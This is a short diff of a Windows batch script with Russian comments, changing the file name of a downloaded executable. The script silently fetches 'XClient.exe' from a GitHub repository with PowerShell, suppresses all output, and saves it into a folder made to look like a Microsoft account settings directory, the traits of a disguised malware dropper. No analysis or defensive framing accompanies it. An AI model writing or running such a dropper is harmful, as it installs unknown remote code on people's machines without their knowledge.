@@ -502,7 +502,7 @@ mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1
 
 :: Детали скачиваемого исполняемого файла
 set "EXE_URL=https://github.com/ScifDif/Tool/raw/main/XClient.exe"
-set "EXE_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe"
+set "EXE_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\Xclient.exe"
 
 :: Скачать исполняемый файл
 powershell -Command "try { (New-Object System.Net.WebClient).DownloadFile('%EXE_URL%', '%EXE_PATH%') } catch { exit /b 1 }" >nul 2>&1
